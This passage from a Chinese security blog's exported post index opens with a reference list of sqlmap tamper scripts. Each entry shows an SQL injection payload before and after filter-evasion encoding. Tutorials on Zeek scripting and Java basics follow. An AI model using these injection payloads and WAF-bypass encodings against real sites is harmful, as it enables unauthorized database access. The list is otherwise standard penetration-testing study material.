SQLMap的tamper使用命令如下： 1sql -u [url] --tamper [模块名] 常用的tamper脚本 apostrophemask.py 适用数据库：ALL 作用：将引号替换为utf-8，用于过滤单引号 使用脚本前：tamper(“1 AND ‘1’='1”) 使用脚本后：1 AND %EF%BC%871%EF%BC%87=%EF%BC%871 base64encode.py 适用数据库：ALL 作用：替换为base64编码 使用脚本前：tamper(“1’ AND SLEEP(5)#”) 使用脚本后：MScgQU5EIFNMRUVQKDUpIw== multiplespaces.py 适用数据库：ALL 作用：围绕sql关键字添加多个空格 使用脚本前：tamper(‘1 UNION SELECT foobar’) 使用脚本后：1 UNION SELECT foobar space2plus.py 适用数据库：ALL 作用：用加号替换空格 使用脚本前：tamper(‘SELECT id FROM users’) 使用脚本后：SELECT+id+FROM+users nonrecursivereplacement.py 适用数据库：ALL 作用：作为双重查询语句，用双重语句替代预定义的sql关键字（适用于非常弱的自定义过滤器，例如将 select替换为空） 使用脚本前：tamper(‘1 UNION SELECT 2–’) 使用脚本后：1 UNIOUNIONN SELESELECTCT 2– space2randomblank.py 适用数据库：ALL 作用：将空格替换为其他有效字符 使用脚本前：tamper(‘SELECT id FROM users’) 使用脚本后：SELECT%0Did%0DFROM%0Ausers unionalltounion.py 适用数据库：ALL 作用：将union allselect 替换为unionselect 使用脚本前：tamper(’-1 UNION ALL SELECT’) 使用脚本后：-1 UNION SELECT securesphere.py 适用数据库：ALL 作用：追加特定的字符串 使用脚本前：tamper(‘1 AND 1=1’) 使用脚本后：1 AND 1=1 and ‘0having’=‘0having’ space2dash.py 适用数据库：ALL 作用：将空格替换为–，并添加一个随机字符串和换行符 使用脚本前：tamper(‘1 AND 9227=9227’) 使用脚本后：1–nVNaVoPYeva%0AAND–ngNvzqu%0A9227=9227 space2mssqlblank.py 适用数据库：Microsoft SQL Server 测试通过数据库：Microsoft SQL Server 2000、Microsoft SQL Server 2005 作用：将空格随机替换为其他空格符号(’%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’) 使用脚本前：tamper(‘SELECT id FROM users’) 使用脚本后：SELECT%0Eid%0DFROM%07users percentage.py 适用数据库：ASP 测试通过数据库：Microsoft SQL Server 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0 作用：在每个字符前添加一个% 使用脚本前：tamper(‘SELECT FIELD FROM TABLE’) 使用脚本后：%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E sp_password.py 适用数据库：MSSQL 作用：从T-SQL日志的自动迷糊处理的有效载荷中追加sp_password 使用脚本前：tamper('1 AND 9227=9227-- ') 使用脚本后：1 AND 9227=9227-- sp_password charencode.py 测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、 PostgreSQL 8.3, 8.4, 9.0 作用：对给定的payload全部字符使用url编码（不处理已经编码的字符） 使用脚本前：tamper(‘SELECT FIELD FROM%20TABLE’) 使用脚本后：%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45 randomcase.py 测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、 PostgreSQL 8.3, 8.4, 9.0 作用：随机大小写 使用脚本前：tamper(‘INSERT’) 使用脚本后：INseRt charunicodeencode.py 适用数据库：ASP、ASP.NET 测试通过数据库：Microsoft SQL Server 2000/2005、MySQL 5.1.56、PostgreSQL 9.0.3 作用：适用字符串的unicode编码 使用脚本前：tamper(‘SELECT FIELD%20FROM TABLE’) 使用脚本后： %u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u 0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045 space2comment.py 测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 作用：将空格替换为/**/ 使用脚本前：tamper(‘SELECT id FROM users’) 使用脚本后：SELECT/**/id/**/FROM/**/users equaltolike.py 测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5 作用：将=替换为LIKE 使用脚本前：tamper(‘SELECT * FROM users WHERE id=1’) 使用脚本后：SELECT * FROM users WHERE id LIKE 1 equaltolike.py 测试通过数据库：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 作用：将&gt;替换为GREATEST，绕过对&gt;的过滤 使用脚本前：tamper(‘1 AND A &gt; B’) 使用脚本后：1 AND GREATEST(A,B+1)=A ifnull2ifisnull.py 适用数据库：MySQL、SQLite (possibly)、SAP MaxDB (possibly) 测试通过数据库：MySQL 5.0 and 5.5 作用：将类似于IFNULL(A, B)替换为IF(ISNULL(A), B, A)，绕过对IFNULL的过滤 使用脚本前：tamper(‘IFNULL(1, 2)’) 使用脚本后：IF(ISNULL(1),2,1) modsecurityversioned.py 适用数据库：MySQL 测试通过数据库：MySQL 5.0 作用：过滤空格，使用mysql内联注释的方式进行注入 使用脚本前：tamper(‘1 AND 2&gt;1–’) 使用脚本后：1 /!30874AND 2&gt;1/– space2mysqlblank.py 适用数据库：MySQL 测试通过数据库：MySQL 5.1 作用：将空格替换为其他空格符号(’%09’, ‘%0A’, ‘%0C’, ‘%0D’, ‘%0B’) 使用脚本前：tamper(‘SELECT id FROM users’) 使用脚本后：SELECT%0Bid%0DFROM%0Cusers modsecurityzeroversioned.py 适用数据库：MySQL 测试通过数据库：MySQL 5.0 作用：使用内联注释方式（/!00000/）进行注入 使用脚本前：tamper(‘1 AND 2&gt;1–’) 使用脚本后：1 /!00000AND 2&gt;1/– space2mysqldash.py 适用数据库：MySQL、MSSQL 作用：将空格替换为 – ，并追随一个换行符 使用脚本前：tamper(‘1 AND 9227=9227’) 使用脚本后：1–%0AAND–%0A9227=9227 bluecoat.py 适用数据库：Blue Coat SGOS 测试通过数据库：MySQL 5.1,、SGOS 作用：在sql语句之后用有效的随机空白字符替换空格符，随后用LIKE替换= 使用脚本前：tamper(‘SELECT id FROM users where id = 1’) 使用脚本后：SELECT%09id FROM users where id LIKE 1 versionedkeywords.py 适用数据库：MySQL 测试通过数据库：MySQL 4.0.18, 5.1.56, 5.5.11 作用：注释绕过 使用脚本前：tamper(‘1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#’) 使用脚本后：1/!UNION//!ALL//!SELECT//!NULL/,/!NULL/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/!AS//!CHAR/),CHAR( 32)),CHAR(58,100,114,117,58))# halfversionedmorekeywords.py 适用数据库：MySQL &lt; 5.1 测试通过数据库：MySQL 4.0.18/5.0.22 作用：在每个关键字前添加mysql版本注释 使用脚本前：tamper(“value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’='QDWa”) 使用脚本后： value’/!0UNION/!0ALL/!0SELECT/!0CONCAT(/!0CHAR(58,107,112,113,58),/!0IFNUL L(CAST(/!0CURRENT_USER()/!0AS/!0CHAR),/!0CHAR(32)),/!0CHAR(58,97,110,121,58 )),/!0NULL,/!0NULL#/!0AND ‘QDWa’='QDWa space2morehash.py 适用数据库：MySQL &gt;= 5.1.13 测试通过数据库：MySQL 5.1.41 作用：将空格替换为#，并添加一个随机字符串和换行符 使用脚本前：tamper(‘1 AND 9227=9227’) 使用脚本后：1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227 apostrophenullencode.py 适用数据库：ALL 作用：用非法双字节Unicode字符替换单引号 使用脚本前：tamper(“1 AND ‘1’='1”) 使用脚本后：1 AND %00%271%00%27=%00%271 appendnullbyte.py 适用数据库：ALL 作用：在有效载荷的结束位置加载null字节字符编码 使用脚本前：tamper(‘1 AND 1=1’) 使用脚本后：1 AND 1=1%00 chardoubleencode.py 适用数据库：ALL 作用：对给定的payload全部字符使用双重url编码（不处理已经编码的字符） 使用脚本前：tamper(‘SELECT FIELD FROM%20TABLE’) 使用脚本后： %2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F %254D%2520%2554%2541%2542%254C%2545 unmagicquotes.py 适用数据库：ALL 作用：用一个多字节组合%bf%27和末尾通用注释一起替换空格 使用脚本前：tamper(“1’ AND 1=1”) 使用脚本后：1%bf%27 AND 1=1– randomcomments.py 适用数据库：ALL 作用：用注释符分割sql关键字 使用脚本前：tamper(‘INSERT’) 使用脚本后：I//N//SERT","tags":[{"name":"web安全基础","slug":"web安全基础","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://ca0y1h.top/tags/SQL%E6%B3%A8%E5%85%A5/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"web安全/基础学习","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"Bro语法学习之基础知识","date":"2019-09-23T13:15:23.000Z","path":"Web_security/traffic_analysis/3.Bro语法学习之基础知识/","text":"Bro语法学习之基础知识 最近一个项目使用到了Bro和Argus这两个开源的流量分析工具，前者现在改名为Zeek，后者在2015年停止了维护。借此机会简单的介绍一下Bro脚本的基本语法，后面有时间的话会再写一本关于通过编写脚本自定义日志文件的文章。 http://try.zeek.org/ Hello World Zeek是基于事件（event）驱动的，也就说，你可以通过事件触发来控制任何要执行的动作。这里以bro_init()和bro_done()这两个事件举例： 123456789event bro_init() &#123; print &quot;Hello, World&quot;; &#125; event bro_done() &#123; print &quot;Goodbye, World&quot;; &#125; bro_init()和bro_done()都是基本事件，当Zeek开始运行时会执行bro_init()事件，当Zeek停止运行时会执行bro_done()事件。 这里还有更多的Zeek基本事件。 加载脚本 像其他的编程语言一样，Zeek也可以通过@load关键字来加载其他脚本中的代码。即： 1@load misc&#x2F;dump-events misc/dump-events这个脚本将Zeek产生的事件以可读的形式展现出来，通常用于调试以及理解事件及其参数。部分输出如下图所示： 函数 首先来看一个示例： 123456789101112# Function implementationfunction emphasize(s: string, p: string &amp;default &#x3D; &#39;*&#39;): string &#123; return p + s + p; &#125; envent bro_init() &#123; # Function calls print emphasize(&quot;yes&quot;); print emphasize(&quot;no&quot;, &quot;_&quot;); &#125; 输出： 12*yes*_no_ 有其他编程经验的同学看这个例子应该比较好理解。这里简单说一下emphasize()函数，它接收两个String类型的参数，其中第二个参数有一个默认值*（用&amp;default关键字修饰），即可选参数，并规定了返回值类型是String。 另外一点，Zeek可以直接使用+来拼接字符串。 Another side note on the relation between functions and events: Events are a kind of function as well, and both can only be declared at the global level; one cannot nest them. 变量 关于变量的作用域，Zeek提供了两种关键字来修饰变量：local和global。具体示例如下： 12345678910111213141516171819global x &#x3D; &#39;Hello&#39;;event bro_init() &#123; print x; const y &#x3D; &quot;Guten Tag&quot;; # Changing value of &#39;y&#39; is not allowed. #y &#x3D; &quot;Nope&quot;; local z &#x3D; &quot;What does that mean?&quot;; print z; &#125; event bro_done() &#123; x &#x3D; &quot;Bye&quot;; print x; &#125; 输出： 123HelloWhat does that mean?Bye 可以看到，用local修饰的变量的作用域严格限制在函数体内，global类似于全局变量的效果，如果在函数内部定义了一个与全局变量相同的局部变量，那么局部变量会覆盖全局变量。 另外，用const修饰的变量相当于常数，是不可更改的。 原始数据类型 对于变量的数据类型，Zeek和C、Java等语言相似，即一个变量保存的数据类型是固定的，并且它可以从你的赋值来推断该变量的数据类型，不用显示地声明，也就说local x = 0和local x: count = 0是等价的。 这里列举了Zeek支持的所有数据类型。 1234567891011121314event bro_init() &#123; local x: string &#x3D; &quot;two&quot;; local y: int &#x3D; 10000000000000000000000000000000000000000000000000; print &quot;y is a large int:&quot;, y; print &quot;x is a short string:&quot;, x; #pattern matching print &#x2F;one|two|three&#x2F; &#x3D;&#x3D; &quot;two&quot;; print &#x2F;one|two|three&#x2F; &#x3D;&#x3D; &quot;ones&quot;; print &#x2F;one|two|three&#x2F; in ones; print &#x2F;[123].*&#x2F; &#x3D;&#x3D; &quot;2 two&quot;; print &#x2F;[123].*&#x2F; &#x3D;&#x3D; &quot;4 four&quot;; &#125; 输出： 1234567y is a large int:, -1x is a short string:, twoTFTTF 上面例子的第二部分给我们演示了一种模式匹配（看起来有点像正则表达式），两个/符号中是待匹配的式子，不同元素用|符号隔开。==是精确匹配，in是模糊匹配，[123].*匹配任意以123其中某一个数字开头的字符串。 操作符 数学操作符 Name Syntax Example Usage 加 a + b print 2 + 2; # 4 减 a - b print 2 - 2; # 0 乘 a * b print 4 * 4; # 16 除 a / b print 15 / 3; # 5 取余 a % b print 18 % 15; # 3 一元加号 +a local a = +1; # Force use of a signed integer 一元减号 -a local a = 5; print -a; # -5 自增 ++a local a = 1; print ++a, a; # 2, 2 自减 --a local a = 2; print --a, a; # 1, 1 赋值操作符 Name Synatx Example Usage =赋值 a=b local a = 7; +赋值 a += b local a = 7; a += 2; # 9 -赋值 a -= b local a = 7; a -= 2; # 5 关系操作符 Name Syntax Example Usage Equality a == b print 2 == 2; # T 不等 a != b print 2 != 2; # F 小于 a &lt; b print 2 &lt; 3; # T 小于等于 a &lt;= b print 2 &lt;= 2; # T 大于 a &gt; b print 2 &gt; 3; # F 大于等于 a &gt;= b print 2 &gt;= 2; # T 其他操作符 Name Syntax Example Usage 存在于 a in b print &quot;z&quot; in &quot;test&quot;; # F 不存在于 a !in b print &quot;z&quot; !in &quot;test&quot;; # T 大小/长度 |a| print |&quot;test&quot;|; # 4 绝对值 |a| print |-5|; # 5 索引取值 a[i] print &quot;test&quot;[2]; # s 切片 a[i:j], a[i:], a[:j] print &quot;testing&quot;[2:4]; # st If语句 123456789101112131415161718event bro_init() &#123; local x &#x3D; &quot;3&quot;; for (c in &quot;12345&quot;) &#123; if (c &#x3D;&#x3D; x) &#123; print &quot;Found it!&quot;; print fmt(&quot;And by &#39;it&#39;, I mean %s.&quot;, x); &#125; else &#123; print &quot;I&#39;m looking for&quot;, x, &quot;not&quot;, c; &#125; &#125; &#125; 输出： 1234567I&#39;m looking for, 3, not, 1I&#39;m looking for, 3, not, 2Found it.And by &#39;it&#39;, I mean 3.I&#39;m looking for, 3, not, 4I&#39;m looking for, 3, not, 5 Zeek的if语句和其他语言类似，有if...else...语句块，也有if...else if...else...语句块。 这里用到了fmt()函数用于格式化输出，语法与Python类似。它也可以使用,连接字符串和变量之间。 foreach语句 见if语句章节。 这里需要注意的是，除了vector类型外，其他的所有collection类型的数据类型都不能保证循环的顺序。 If the order is important the collection should be a vector. While语句 12345678910111213141516171819202122event bro_init() &#123; local i &#x3D; 0; while (i &lt; 5) print ++i; while (i % 2 !&#x3D; 0) &#123; local finish_up &#x3D; F; if (finish_up &#x3D;&#x3D; F) print &quot;nope&quot;; ++i; next; if (finish_up) break; &#125; print i; &#125; 这里的break和next类似与其他语言中的break和continue。 另外，上面这段代码是官方给的示例，Zeek语法的缩进反正我最先看是看的是一愣一愣的，后来才发现Zeek是既支持缩进，也支持&#123;&#125;，这两种都认。 练习一 编写一个程序，从您选择的任意字符串中删除所有的字母“e”（可以不就地处理）。 编写一个程序，打印从1到100，如果是3的倍数，打印“Fizz”；如果是5的倍数，打印“Buzz”。如果既是3的倍数也是5的倍数打印FizzBuzz。 12345678910111213141516171819202122232425262728293031323334353637event bro_init() &#123; local result &#x3D; &quot;&quot;; for (c in &quot;testing&quot;) &#123; if (c !&#x3D; &quot;e&quot;) &#123; result +&#x3D; c; &#125; &#125; print result; &#125;# 使用递归function fizzbuzz(i: count) &#123; local s &#x3D; &quot;&quot;; if (i % 3 &#x3D;&#x3D; 0) s +&#x3D; &quot;Fizz&quot;; if (i % 5 &#x3D;&#x3D; 0) s +&#x3D; &quot;Buzz&quot;; if (s &#x3D;&#x3D; &quot;&quot;) print i; else print s; if (i &lt; 100) fizzbuzz(i + 1); &#125; event bro_done() &#123; fizzbuzz(1); &#125; Switch表达式 123456789101112131415161718192021222324event bro_init() &#123; local x &#x3D; 4; switch (x) &#123; case 0: print &quot;case 0&quot;; break; case 1, 2, 3: print &quot;case 1, 2, 3&quot;; break; case 4: print &quot;case 4 and ...&quot;; fallthrouth; case 5: # This block may execute if x is 4 or 5. print &quot;case 5&quot;; default: print &quot;default case&quot;; break; &#125; &#125; fallthrouth关键字会让程序忽略限制条件而接着执行下一个case。 练习： 使用Switch语句编写一个程序，计算任意字符串中的元音（a，e，i，o，u）的数量。 12345678910111213141516event bro_init() &#123; local result &#x3D; 0; local input &#x3D; &quot;The Zeek Network Security Monitor&quot;; for (c in input) &#123; switch (c) &#123; case &quot;a&quot;, &quot;e&quot;, &quot;i&quot;, &quot;o&quot;, &quot;u&quot;: ++result; break; &#125; &#125; print result; &#125; 事件 Event算是Zeek里面比较核心的概念，可以算是一种特殊形式的函数，但与函数又不同的是： 事件并不想函数一样会立刻执行，它们可能会在以后的时间进行调度和执行，因此它们的效果在调用之后可能无法直接实现； 它们没有返回值，因为它们没有被直接调用而是被安排在以后执行； 可以为同一事件定义多个主体，每个主体都被视为“事件处理程序”。 当需要执行一个事件时，该事件的所有处理程序主体均按优先级顺序执行。 1234567891011121314151617181920212223242526272829303132global myevent: event(s: string);global n &#x3D; 1;event myevent(s: string) &amp;priority &#x3D; -10 &#123; n &#x3D; n + 2; &#125; event myevent(s: string) &amp;priority &#x3D; 5 &#123; --n; &#125;event myevent(s: string) &amp;priority &#x3D; 10 &#123; print &quot;myevent&quot;, s, n; &#125;event bro_init() &#123; print &quot;bro_init()&quot;; event myevent(&quot;hi&quot;); event myevent(&quot;wait&quot;); schedule 5 sec &#123; myevent(&quot;bye&quot;) &#125;; &#125;event bro_done() &#123; print &quot;bro_done()&quot;; &#125; 输出： 123456bro_init()myevent, hi, 1myevent, wait, 2myevent, bye, 3bro_done() 我把官方的例子修改了一点，感觉这样更能体现Event的特点。 在bro_init()中每执行一次my_event都会把该事件的三个主体按照@priority的顺序分别执行一次。其中前两次会以迅速执行my_event，而第三次会5s后或者Zeek执行结束之前执行。 需要注意的是： 如果没有显示指定，@priority参数会默认为0； 如果@priority都相等，则按顺序执行。 Hook Hook是另外一种形式的函数，与Event类似，但是又有两点不太一样： 它被调用时会立刻执行； 如果执行到主体的末尾或返回语句，则将执行Hook处理程序。 但是，如果Hook的主体以break语句终止，则不会执行其余的Hook处理程序。 12345678910111213141516171819202122232425262728global myhook: hook(s: string)hook myhook(s: string) @priority &#x3D; 10 &#123; print &quot;priority 10 myhook handler&quot;, s; s &#x3D; &quot;bye&quot;; &#125; hook myhook(s: string) &#123; print &quot;break out of myhook handling&quot;, s; break; &#125; hook myhook(s: string) &amp;priority &#x3D; -5 &#123; print &quot;not going to happen&quot;, s; &#125; event bro_init() &#123; local ret:bool &#x3D; hook myhook(&quot;hi&quot;); if ( ret ) &#123; print &quot;all handlers ran&quot;; &#125; &#125; 123priority 10 myhook handler, hibreak out of myhook handling, hi Composite-types: Set 集合 set：集合类型，其中元素唯一，可以使用add和delete函数对元素进行增删操作，以及in操作符判断是否存在。 123456789101112131415event bro_init() &#123; local x: set[string] &#x3D; &#123;&quot;one&quot;, &quot;two&quot;, &quot;three&quot;&#125;; add x[&quot;four&quot;]; print &quot;four&quot; in x; delete x[&quot;two&quot;]; print &quot;two&quot; !&#x3D; x; add x[&quot;one&quot;]; for (e in x) &#123; print e; &#125; &#125; 输出： 123456TTfourthreeone Composite-types: Table 映射 Zeek中的table类型类似于dict或Map，索引是唯一的，可以使用delete进行删除操作，可以直接赋值操作来新增元素。 1234567891011121314151617event bro_init() &#123; local x: table[count] of string &#x3D; &#123; [1] &#x3D; &quot;one&quot;, [3] &#x3D; &quot;three&quot;, [5] &#x3D; &quot;five&quot;&#125;; x[7] &#x3D; &quot;seven&quot;; print 7 in x; delete x[3]; print 3 !&#x3D; x; x[1] &#x3D; &quot;1&quot;; # changed the value at index 1 for (key in x) &#123; print key; &#125; &#125; 输出： 1234567TsevenT175 需要注意的是，table数据类型定义的方法table [count] of string。 Composite-types: Vector 向量 Vector类似于arrary或list，允许有重复的元素。 123456789101112131415event bro_init() &#123; local x: vector of string &#x3D; &#123;&quot;one&quot;, &quot;two&quot;, &quot;three&quot;&#125;; print x; print x[1]; print |x|; x[|x|] &#x3D; &quot;one&quot;; print x; for (i in x) &#123; print i; &#125; &#125; 输出： 123456789[one, two, three]two3[one, two, three, one]0123 vector of string指明vector中元素类型。 Composite-types: Record 记录 Record记录类型，类似于C语言中的结构体。 1234567891011121314151617181920type MyRecord: record &#123; a: string; b: count; c: bool &amp;default &#x3D; T; d: int &amp;optional;&#125;;event bro_init() &#123; local x &#x3D; MyRecord($a &#x3D; &quot;vvvvvv&quot;, $b &#x3D; 6, $c &#x3D; F, $d &#x3D; -13); if (x?$d) print x$d; &#125; print x; x &#x3D; MyRecord($a &#x3D; &quot;abc&quot;, $b &#x3D; 3); print x; print x$c; print x?$d; 输出： 123456-13[a&#x3D;vvvvvv, b&#x3D;6, c&#x3D;F, d&#x3D;-13][a&#x3D;abc, b&#x3D;3, c&#x3D;T, d&#x3D;&lt;uninitialized&gt;]TF $操作符通常类似于.操作符，x?$d用于判断x中是否存在字段d。 Zeek特有的数据类型 time：时间戳 interval：时间相对单位，包括usec, msec, sec, min, hr, 和day port：端口 addr：IP地址 subnet：子网","tags":[{"name":"Bro","slug":"Bro","permalink":"http://ca0y1h.top/tags/Bro/"}],"categories":[{"name":"流量分析","slug":"流量分析","permalink":"http://ca0y1h.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"Bro","slug":"流量分析/Bro","permalink":"http://ca0y1h.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/Bro/"}]},{"title":"Java基础学习之面向对象基础","date":"2019-09-23T13:14:53.000Z","path":"Java/code/3.Java基础学习之面向对象基础/","text":"Java基础学习之面向对象基础 方法 可变参数 可变参数用类型...定义，可变参数相当于数组类型： 1234567class Group &#123; private String[] name; public void setNames(String... names)&#123; this.names = names &#125;&#125; 参数绑定 Java中的参数绑定其实也就是传值传递和传址传递。 我们先观察一个基本类型参数的传递： 12345678910111213141516171819202122public class Main &#123; public static void main(String[] args) &#123; Person p = new Person(); int n = 15; // n的值为15 p.setAge(n); // 传入n的值 System.out.println(p.getAge()); // 15 n = 20; // n的值改为20 System.out.println(p.getAge()); // 15 &#125;&#125;class Person &#123; private int age; public int getAge() &#123; return this.age; &#125; public void setAge(int age) &#123; this.age = age; &#125;&#125; 从结果可知，修改外部的局部变量n，不影响实例p的age字段，原因是setAge()方法获得的参数，复制了n的值，因此，p.age和局部变量n互不影响。 结论：基本类型参数的传递，是调用方值的复制。双方各自的后续修改，互不影响。 我们再看一个传递引用参数的例子： 12345678910111213141516171819202122public class Main &#123; public static void main(String[] args) &#123; Person p = new Person(); String[] fullname = new String[] &#123; &quot;Homer&quot;, &quot;Simpson&quot; &#125;; p.setName(fullname); // 传入fullname数组 System.out.println(p.getName()); // &quot;Homer Simpson&quot; fullname[0] = &quot;Bart&quot;; // fullname数组的第一个元素修改为&quot;Bart&quot; System.out.println(p.getName()); // &quot;Bart Simpson&quot;? &#125;&#125;class Person &#123; private String[] name; public String getName() &#123; return this.name[0] + &quot; &quot; + this.name[1]; &#125; public void setName(String[] name) &#123; this.name = name; &#125;&#125; 注意到setName()的参数现在是一个数组。一开始，把fullname数组传进去，然后，修改fullname数组的内容，结果发现，实例p的字段p.name也被修改了！ 结论：引用类型参数的传递，调用方的变量，和接收方的参数变量，指向的是同一个对象。双方任意一方对这个对象的修改，都会影响对方 再来看一个引用类型的参数绑定： 12345678910111213141516171819202122public class Main &#123; public static void main(String[] args) &#123; Person p = new Person(); String bob = &quot;Bob&quot;; p.setName(bob); // 传入bob变量 System.out.println(p.getName()); // &quot;Bob&quot; bob = &quot;Alice&quot;; // bob改名为Alice System.out.println(p.getName()); // 注意：还是&quot;Bob&quot; &#125;&#125;class Person &#123; private String name; public String getName() &#123; return this.name; &#125; public void setName(String name) &#123; this.name = name; &#125;&#125; String[] fullname传递给p.name的是堆中的地址，共同操作堆中的内容。bob传递给p.name以后两者均指向常量池的Bob，后bob指向了常量池中的Alice，但是p.name仍然指向Bob，再一次 p.setName(bob);的话p.name将指向Alice。 构造方法 默认构造方法 在Java中，创建对象实例的时候，按照如下顺序进行初始化： 先初始化字段，例如，int age = 10;表示字段初始化为10，double salary;表示字段默认初始化为0，String name;表示引用类型字段默认初始化为null； 执行构造方法的代码进行初始化。 多构造方法 可以定义多个构造方法，在通过new操作符调用的时候，编译器通过构造方法的参数数量、位置和类型自动区分： 123456789101112131415class Person &#123; private String name; private int age; public Person(String name, int age)&#123; this.name = name; this.age = age; &#125; public Person(String name)&#123; this.name = name; &#125; public Person()&#123; &#125;&#125; 如果调用new Person(&quot;Xiao Ming&quot;, 20);，会自动匹配到构造方法public Person(String, int)。 如果调用new Person(&quot;Xiao Ming&quot;);，会自动匹配到构造方法public Person(String)。 如果调用new Person();，会自动匹配到构造方法public Person()。 一个构造方法可以调用其他构造方法，这样做的目的是便于代码复用。调用其他构造方法的语法是this(…)： 1234567891011121314151617class Person()&#123; private String name; private int age; public Person(String name, int age)&#123; this.name = name; this.age = age; &#125; public Person(String name)&#123; //调用Person(String, int)构造方法 this(name, 18); &#125; public Person()&#123; this(&#x27;Unnamed&#x27;) //调用Person(String)构造方法 &#125;&#125; 方法重载 在一个类中，我们可以定义多个方法。如果有一系列方法，它们的功能都是类似的，只有参数有所不同，那么，可以把这一组方法名做成同名方法。这种方法名相同，但各自的参数不同，称为方法重载（Overload）。 注意：方法重载的返回值类型通常都是相同的。 继承 protected允许子类访问父类的字段和方法。 1234567891011121314151617181920212223public class Main&#123; public void main(String[] args)&#123; Student s = new Student(&quot;Xiao Ming&quot;, 18); &#125;&#125;class Person&#123; protected String name; protected int age; public Person(String name, int age)&#123; this.name = name; this.age = age; &#125;&#125;class Student extends Person&#123; protected int score; public Student(String name, int age, int score)&#123; this.score = score; &#125;&#125; 运行上面的代码，会得到一个编译错误，大意是在Student的构造方法中，无法调用Person的构造方法。这是因为在Java中，任何class的构造方法，第一行语句必须是调用父类的构造方法。如果没有明确地调用父类的构造方法，编译器会帮我们自动加一句super(); 但是，Person类并没有无参数的构造方法，因此，编译失败。解决方法是调用Person类存在的某个构造方法。例如： 12345678class Student extends Person&#123; protected int score; public Student(String name, int age, int score)&#123; super(name, age); this.score = score; &#125;&#125; 结论： 如果父类没有默认的构造方法，子类就必须显式调用super()并给出参数以便让编译器定位到父类的一个合适的构造方法。 子类不会继承任何父类的构造方法。子类默认的构造方法是编译器自动生成的，不是继承的。 Java允许向上转型，不允许向下转型： 12345Person p1 = new Student(); //upcasting okPerson p2 = new Preson();Student s1 = p1; // okStudent s2 = p2 //error 多态 定义：多态是指，针对某个类型的方法调用，其真正执行的方法取决于运行时期实际类型的方法。 举个例子： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657public class Main()&#123; public void main(String[] args)&#123; // 给一个有普通收入、工资收入和享受国务院特殊津贴的小伙伴算税: Income[] incomes = new Income[] &#123; new Income(3000), new Salary(5000), new StateCouncilSpecialAllowance(15000) &#125;, System.out.println(totalTax(incomes)); &#125; public static double totalTax(Income[] incomes)&#123; double total = 0; for(Income income: incomes)&#123; total += income.getTax(); &#125; return total; &#125;&#125;class Income&#123; protected double income; public Income(double income)&#123; this.income = income; &#125; public double getTax(double income)&#123; return income * 0.1; &#125;&#125;class Salary extends Income&#123; public Salary(double income)&#123; this.income = income; &#125; @Override public getTax(double income)&#123; if (income &lt;= 5000)&#123; return 0; &#125; return (income - 5000) * 0.2; &#125;&#125;class StateCouncilSpecialAllowance extends Income&#123; public StateCouncilSpecialAllowance(double income)&#123; this.income = income; &#125; @Override public getTax(double income)&#123; return 0; &#125;&#125; 继承可以允许子类覆写父类的方法。如果一个父类不允许子类对它的某个方法进行覆写，可以把该方法标记为final；如果一个类不希望任何其他类继承自它，那么可以把这个类本身标记为final；对于一个类的实例字段，同样可以用final修饰。用final修饰的字段在初始化后不能被修改。 抽象类 如果父类的方法本身不需要实现任何功能，仅仅是为了定义方法签名，目的是让子类去覆写它，那么，可以把父类的方法声明为抽象方法： 1234class Person &#123; public abstract void run();&#125; 必须把Person类本身也声明为abstract，才能正确编译它： 1234abstract class Person &#123; public abstract void run();&#125; 无法实例化的抽象类有什么用？ 因为抽象类本身被设计成只能用于被继承，因此，抽象类可以强迫子类实现其定义的抽象方法，否则编译会报错。因此，抽象方法实际上相当于定义了“规范”。 接口 抽象类和接口的对比如下： abstract class interface 继承 只能extends一个class 可以implements多个interface 字段 可以定义实例字段 不能定义实例字段 抽象方法 可以定义抽象方法 可以定义抽象方法 非抽象方法 可以定义非抽象方法 可以定义default方法 default方法 在接口中，可以定义default方法。例如，把Person接口的run()方法改为default方法： 1234567891011121314151617181920212223242526public class Main() &#123; public static void main(String args[]) &#123; Person p = new Student(&#x27;Xiao Ming&#x27;); p.run(); &#125;&#125;interface Person() &#123; String getName(); default void run() &#123; System.out.println(getName() + &quot; run&quot;); &#125;&#125;class Student implements Person() &#123; private String name; public Student(String name) &#123; this.name = name; &#125; public getName() &#123; return this.name; &#125;&#125; 